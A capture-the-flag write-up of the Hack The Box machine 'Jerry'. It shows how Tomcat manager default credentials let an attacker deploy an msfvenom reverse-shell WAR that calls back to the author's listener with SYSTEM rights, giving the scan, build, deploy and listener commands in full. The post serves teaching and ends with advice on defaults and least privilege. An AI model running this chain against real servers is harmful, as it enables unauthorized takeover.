---
layout: post
title: "Two for the Price of One"
subtitle: "HTB Jerry, where a default Tomcat manager password lets you deploy a war file and the shell that comes back is already SYSTEM"
date: 2018-11-24 12:00:00 +0000
description: "One open port, a manager login that still uses its factory password, and a war file that hands you SYSTEM in a single move."
image: /assets/og/two-for-the-price-of-one.png
tags: [hackthebox, writeup]
---

Jerry is a box you can finish before your coffee cools. One port answers, and behind it sits a Tomcat manager that never had its locks changed since the day it left the factory. The username is tomcat. The password is s3cret. Both of them are printed in the manual, and the manual is on the internet. Once you are inside the manager, Tomcat will happily let you upload a web application and run it, and on this Windows host the service runs as SYSTEM. So you build one small malicious application, click deploy, visit a URL, and the prompt that lands in your listener is already the most powerful account on the machine. There is no privilege escalation here because there is nothing left to escalate to. The front door and the throne room are the same room.

```
        J E R R Y   /  T O M C A T
        ===========================
        :8080  manager  →  "username and password please"
                            tomcat / s3cret  (the factory default)
                                |
                                v
        "want to deploy an application?"  →  here is a .war
                                |
        tomcat unzips it, runs it, calls you back
                                |
                                v
        the service runs as SYSTEM, so the shell does too.
        no second act. you opened the door and were already king.
                                            城
```

## 0x01 · one light on in the house

The scan is almost rude in how little it gives you. A full TCP sweep finds a single open port and nothing else.

```
# nmap -sT -p- --min-rate 5000 10.10.10.95
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

Run service detection against that one port and the box tells you exactly what it is.

```
# nmap -sV -sC -p 8080 -oA nmap/initial 10.10.10.95
8080/tcp open  http   Apache Tomcat/Coyote JSP engine 1.1
```

Apache Tomcat is a Java application server. Think of it like a stage with a backstage door. The stage is where it serves web pages to the public, and the backstage door, the manager, is where an administrator walks in to swap one show out for another. When only one port answers and that port is Tomcat, the whole box is about whether the backstage door is locked. So you go knock on it. The manager lives at `/manager/html`, and it answers with an authentication prompt, which means there is a lock. The only question left is whether anyone changed the key.

## 0x02 · the key that came in the box

Tomcat ships with example accounts, and the worst thing an administrator can do is leave them in place. The classic pair on a box like this is `tomcat` / `s3cret`. These are not secrets you crack. They are defaults you look up.

There is a small gift here too. Older Tomcat manager pages, when you fail a login, hand back a 401 error that helpfully prints the very example credentials the documentation suggests you remove. Picture a bank vault with a sticky note on the door that reads "in case you forgot, the combination is still 0-0-0-0." The mechanism that is supposed to keep you out is the same mechanism telling you the way in. You feed the pair back to the login form, and the manager opens.

```
# curl -su tomcat:s3cret http://10.10.10.95:8080/manager/html | grep -i "WAR file to deploy"
   ...Deploy directory or WAR file located on server...
   ...WAR file to deploy...
```

That `grep` matching is the whole confirmation. The manager interface is in front of you, and it includes a section called "WAR file to deploy." That section is the rest of the box.

## 0x03 · a parcel the server unwraps and obeys

A WAR file (Web Application Archive) is just a ZIP with a Java application inside and a manifest that tells Tomcat how to run it. Tomcat's entire job is to take one of these, unpack it, and execute whatever code it contains. That is not a bug. That is the product working exactly as designed. The bug is that the person holding the keys to the deploy button is now you.

Think of it like a mailroom with a standing order to open any package addressed to it and follow the instructions inside. Normally the only people who can mail a package are trusted staff. The default password just made you trusted staff. So you mail the mailroom a package whose instructions are "call this number and do whatever the voice on the line says."

Build the package with `msfvenom`. The payload is a Windows reverse shell, the listener address is your own box, and the output format is `war`.

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=9002 \
    -f war > iceberg.war
Payload size: 324 bytes
Final size of war file: 52311 bytes
```

The payload itself I am describing rather than printing, on purpose. It is a `windows/shell_reverse_tcp` stub, which is to say <reverse shell that connects back to 10.10.14.4 on 9002 and hands over a command prompt>. A live, copy-paste reverse shell on disk is exactly the kind of artifact that gets a file flagged as malware and re-used by people who should not have it, so the shape is here and the runnable string is not.

One detail matters for the next step. Inside that WAR, the actual page that fires the payload has a randomly named `.jsp` file, and you need its name. List the archive to read it.

```
# jar -ft iceberg.war
WEB-INF/
WEB-INF/web.xml
ppaejmsg.jsp
```

So the trigger page will be `ppaejmsg.jsp`. Hold that name.

## 0x04 · deploy, and the call comes home

Upload the WAR through the manager's deploy section. You can click through the browser, or you can do it in one line with `curl`, authenticating with the same default creds and handing the file to the deploy endpoint.

```
# curl -su tomcat:s3cret \
    -T iceberg.war \
    "http://10.10.10.95:8080/manager/text/deploy?path=/iceberg"
OK - Deployed application at context path [/iceberg]
```

`OK - Deployed` means Tomcat has unpacked your application and it is now live under `/iceberg`. Start a listener so the call has somewhere to land, then visit the trigger page and the payload runs inside the Tomcat process.

```
# nc -lnvp 9002
listening on [any] 9002 ...

# (in another terminal)
# curl http://10.10.10.95:8080/iceberg/ppaejmsg.jsp
```

Back in the listener, a prompt appears, and the first thing you ask any new shell is who you are.

```
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.95] 49210
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation.

C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

Read that line twice. Not a service user. Not an account you now have to climb out of. `nt authority\system`, the highest local authority on a Windows machine, on the very first shell. The service was running as SYSTEM, so anything the service runs is SYSTEM, and you just convinced the service to run your code.

## 0x05 · two flags, one envelope

Most boxes make you find user, then claw your way up to root. Jerry is so flat that it does not bother. Whoever built it left both flags in a single file, in the administrator's own desktop, with a name that reads like a punchline.

```
C:\> cd C:\Users\Administrator\Desktop\flags
C:\Users\Administrator\Desktop\flags> dir
   2 for the price of 1.txt

C:\Users\Administrator\Desktop\flags> type "2 for the price of 1.txt"
user.txt
████████████████████████████████
root.txt
████████████████████████████████
```

That file name is the box winking at you. There was never a second climb, because there was never a second wall. One default password collapsed the entire distance between stranger and SYSTEM.

## 0x06 · the honest caveat

It is easy to laugh Jerry off as a toy, and as a puzzle it almost is. But the thing it is teaching is not a relic, it is one of the most common ways real networks fall, and it has nothing to do with skill. The Tomcat code is not vulnerable. The deploy feature is not a flaw. Every single piece of this machine is working precisely as the vendor intended. The only thing that went wrong is that a human stood up a server and never changed the password it shipped with.

Default credentials are the quietest catastrophe in security because they look like nothing. There is no CVE to track, no patch to apply, no scary banner. There is just a field that already had an answer typed into it at the factory, and a long line of people who assumed someone else would clear it. Picture a brand-new apartment building where every unit ships with the same key, the locksmith leaves a note in the lobby listing that key, and the landlord means to re-key every door eventually. Until "eventually" arrives, the building is one open hallway. That is a default password on an internet-facing admin panel.

And notice the multiplier. The thing you could reach was not a guestbook or a status page. It was the deploy button, the one control whose entire purpose is to run new code on the server. A weak password on a powerless page is an annoyance. A weak password on the one page that executes code, attached to a service running as SYSTEM, is a total takeover with a single guess. The lesson generalizes hard. Change every default credential before a box ever touches a network, and run your services as the smallest account that can do the job, never as SYSTEM, so that even a perfect break-in lands somewhere with walls left to climb.

## 0x07 · outro

```
one port. one login that still wore its factory password.
one application, uploaded, that the server ran without a second thought.

there was no privilege to escalate. the door and the throne were one room,
because the service that opened the door was already the king.

change the default. shrink the account. test the door before the world does.
wear black.

                                                            EOF
```

---

*HTB: Jerry, retired 17 Nov 2018. An easy Windows box that is really a one-line lecture on default credentials and least privilege, wearing a Tomcat manager costume. The factory key still opens the door in a lab and nowhere you don't own.*